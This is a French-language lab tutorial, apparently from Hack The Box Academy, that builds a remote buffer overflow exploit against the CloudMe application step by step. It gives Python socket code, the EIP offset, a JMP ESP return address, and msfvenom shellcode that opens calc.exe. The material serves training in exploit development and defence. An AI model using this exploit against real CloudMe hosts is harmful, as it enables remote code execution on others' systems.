Créer un exploit à distance
=========================

* * * * *

Après avoir fuzzé le port d'écoute, les étapes restantes d'identification et d'exploitation du débordement de tampon doivent être en grande partie les mêmes que pour l'exploitation du débordement de tampon local. Les principales étapes que nous avons suivies dans les sections précédentes étaient :

1. Paramètres de fuzzing
2. Contrôler l'EIP
3. Identifier les mauvais personnages
4. Trouver une instruction de retour
5. Passer au Shellcode

Une fois le fuzzing terminé, nous allons parcourir les étapes restantes de cette section jusqu'à ce que nous puissions exploiter avec succès la vulnérabilité de dépassement de mémoire tampon.

* * * * *

Contrôle de l'EIP
---------------

Nous allons commencer par créer un modèle unique de `2000` octets de long, en utilisant `ERC --pattern c 2000` comme nous l'avons fait précédemment : ![Remote Pattern](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_pattern.jpg)

Nous commençons maintenant à écrire notre fonction `eip_offset()` . Nous ajouterons notre variable `pattern` comme avec le modèle sous `Ascii` dans le fichier `Pattern_Create_1.txt` créé sur notre bureau, comme nous l'avons fait avec notre exploit précédent. Après cela, pour envoyer notre modèle, nous pouvons utiliser le même code que nous avons utilisé pour fuzzer le port :

Code : python

```
def eip_offset():
    pattern = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
                    ...SNIP...
                    "5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co", "utf-8")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(pattern)
    s.close()

eip_offset()

```

Une fois que notre fonction `eip_offset()` est prête, nous pouvons redémarrer notre programme dans `x32dbg` et exécuter notre code, et notre programme devrait planter, et nous devrions voir `EIP` écrasé par notre modèle comme `316A4230` : ![Pattern Crash](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_pattern_crash.jpg)

Nous pouvons maintenant utiliser `ERC --pattern o 1jB0` pour calculer le décalage exact, qui se trouve à `1052` octets :

![Décalage de motif](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_pattern_offset.jpg)

Maintenant, pour nous assurer que nous pouvons contrôler la valeur exacte à `EIP`, nous allons utiliser la même fonction `eip_control()` de notre exploit précédent (tout en modifiant `offset`), mais en utilisant `socket` pour envoyer notre charge utile à la place de l'écrire dans un fichier :

Code : python

```
def eip_control():
    offset = 1052
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

eip_control()

```

Nous allons à nouveau redémarrer notre programme et exécuter notre exploit, et nous pouvons confirmer que nous contrôlons `EIP` car nous avons remplacé `EIP` par 4 `B` : ![Pattern Control](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_pattern_control.jpg)

* * * * *

Identifier les mauvais personnages
--------------------------

Notre prochaine étape consiste à déterminer si nous devons éviter d'utiliser de mauvais caractères dans notre entrée. Nous pouvons commencer par exécuter `ERC --bytearray` dans `x32dbg` pour créer notre fichier `ByteArray_1.bin` . Ensuite, nous pouvons copier les mêmes fonctions `bad_chars()` de notre exploit précédent, et encore une fois passer de l'écriture de la charge utile dans un fichier à son envoi vers le port :

Code : python

```
def bad_chars():
    all_chars = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        ...SNIP...
        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])

    offset = 1052
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

bad_chars()

```

Une fois que nous avons redémarré notre programme dans `x32dbg` et exécuté notre exploit, nous pouvons utiliser `ERC --compare` pour comparer les octets à l'adresse `ESP` avec le fichier `ByteArray_1.bin` : ![Bytes Compare](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_bytes_compare.jpg)

Comme nous pouvons le voir, tous les octets correspondent entre la mémoire et `ByteArray_1.bin`, ce qui signifie que ce programme n'a pas de mauvais caractères.

* * * * *

Trouver une instruction de retour
-------------------------------------

Maintenant que nous avons le contrôle sur `EIP` et que nous savons quels mauvais caractères éviter dans notre charge utile, nous devons trouver une instruction pour exécuter la charge utile que nous placerons sur la pile. Encore une fois, puisque ce programme n'a pas de mauvais caractères, nous pouvons utiliser l'adresse `ESP` comme adresse de retour. (Essayez d'exploiter le programme en utilisant `ESP` comme adresse de retour).

Cependant, nous préférerons utiliser une adresse d'une instruction construite dans le programme pour nous assurer qu'elle fonctionnera sur n'importe quel système, car ces instructions seront les mêmes sur n'importe quel système. Donc, nous allons d'abord obtenir une liste des modules et bibliothèques chargés par le programme, et nous ne considérerons que ceux qui ont `False` pour toutes les protections, qui sont les suivants :

```
------------------------------------------------------------------------------------------------------------------------
Process Name: CloudMe Modules total: 79
------------------------------------------------------------------------------------------------------------------------
 Base          | Entry point   | Size      | Rebase   | SafeSEH  | ASLR    | NXCompat | OS DLL  | Version, Name and Path
------------------------------------------------------------------------------------------------------------------------
 0x400000        0x14c0          0x431000    False      False      False      False      False      C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\CloudMe.exe
 0x61b40000      0x1410          0x5f6000    False      False      False      False      False      5.9.0.0;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll
 0x69900000      0x1410          0x1c1000    False      False      False      False      False      5.9.0.0;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll
 0x6d9c0000      0x1410          0x4c000     False      False      False      False      False      5.9.0.0;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\Qt5Sql.dll
 0x66e00000      0x1410          0x3d000     False      False      False      False      False      5.9.0.0;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\Qt5Xml.dll
 0x6eb40000      0x1410          0x24000     False      False      False      False      False      C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\libgcc_s_dw2-1.dll
 0x6fe40000      0x1410          0x17e000    False      False      False      False      False      C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\libstdc++-6.dll
 0x64b40000      0x1410          0x1b000     False      False      False      False      False      1,;WinPthreadGC;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\libwinpthread-1.dll
 0x6aa80000      0x1410          0x1b7000    False      False      False      False      False      5.9.0.0;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\platforms\qwindows.dll

```

Comme nous pouvons le voir, plusieurs bibliothèques sont chargées par le programme sans protection de la mémoire, y compris le programme `CloudMe.exe` lui-même. Pour tous les rechercher `JMP ESP`, nous pouvons accéder à l'onglet `CPU` et cliquer avec le bouton droit de la souris, puis sélectionner `Rechercher>Tous les modules>Commande` et entrer `JMP ESP`, et nous obtiendrons une liste d'instructions `JMP ESP` dans les modules chargés : ![Find JMP](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_find_jmp_1.jpg)

Si nous n'avions trouvé aucun résultat, nous pourrions rechercher le modèle `FFE4` dans l'ensemble du module ou dans tous les modules, comme indiqué dans une section précédente. Nous pouvons également rechercher d'autres instructions utiles, comme `54C3`. Dans notre cas, après avoir double-cliqué sur le premier résultat pour nous assurer qu'il s'agit bien de `JMP ESP`, nous pouvons copier l'adresse `0069D2E5` et l'utiliser dans notre exploit. (Essayez de trouver d'autres instructions et utilisez-les comme adresse de retour).

* * * * *

Passer au Shellcode
--------------------

Notre dernière étape consiste à exploiter le programme, nous allons donc commencer par créer notre shellcode avec `msfvenom` pour ouvrir `calc.exe` comme preuve d'une exploitation réussie :

```
dsgsec@htb[/htb]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python'

...SNIP...
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
...SNIP...

```

Maintenant, pour créer notre fonction `exploit()` finale, nous allons d'abord ajouter la sortie ci-dessus et utiliser la même `charge utile` de notre exploit précédent (tout en modifiant `offset` et l'adresse dans `eip`). Enfin, nous utiliserons le même code de `bad_chars()` pour envoyer notre charge utile au port :

Code : python

```
def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python'
    buf = b""
    ...SNIP...
    buf += b"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

    offset = 1052
    buffer = b"A"*offset
    eip = pack('<L', 0x0069D2E5)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

```

Enfin, nous pouvons exécuter `CloudMe` (pas nécessairement dans `x32dbg`) et exécuter notre exploit, et nous devrions le voir planter, et une calculatrice devrait s'ouvrir.

Plein écran  Terminer   Réinitialiser

Durée de vie restante : 23 m

Connecté à htb-fo2pycxhnp:1 (htb-ac-69068)

[ Précédent](https://academy.hackthebox.com/module/89/section/950)

Marquer terminé et suivant

[Suivant ](https://academy.hackthebox.com/module/89/section/952)

Aide-mémoire

##### Table des matières

[Buffer Overflow](https://academy.hackthebox.com/module/89/section/931)[  Débogage des programmes Windows](https://academy.hackthebox.com/module/89/section/932)

###### Débordement de la mémoire tampon locale

[  Paramètres de fuzzing](https://academy.hackthebox.com/module/89/section/933)[  Contrôle de l'EIP](https://academy.hackthebox.com/module/89/section/946)[  Identification des caractères incorrects ](https://academy.hackthebox.com/module/89/section/947)[  Trouver une instruction de retour](https://academy.hackthebox.com/module/89/section/948)[  Passer au Shellcode](https://academy.hackthebox.com/module/89/section/949)

###### Débordement de tampon distant

[  Fuzzing à distance](https://academy.hackthebox.com/module/89/section/950)[  Construire un exploit à distance](https://academy.hackthebox.com/module/89/section/951)[  À distance Exploitation] (https://academy.hackthebox.com/module/89/section/952)

###### Évaluation des compétences

[  Évaluation des compétences](https://academy.hackthebox.com/module/89/section/961)

##### Mon poste de travail

Interagir
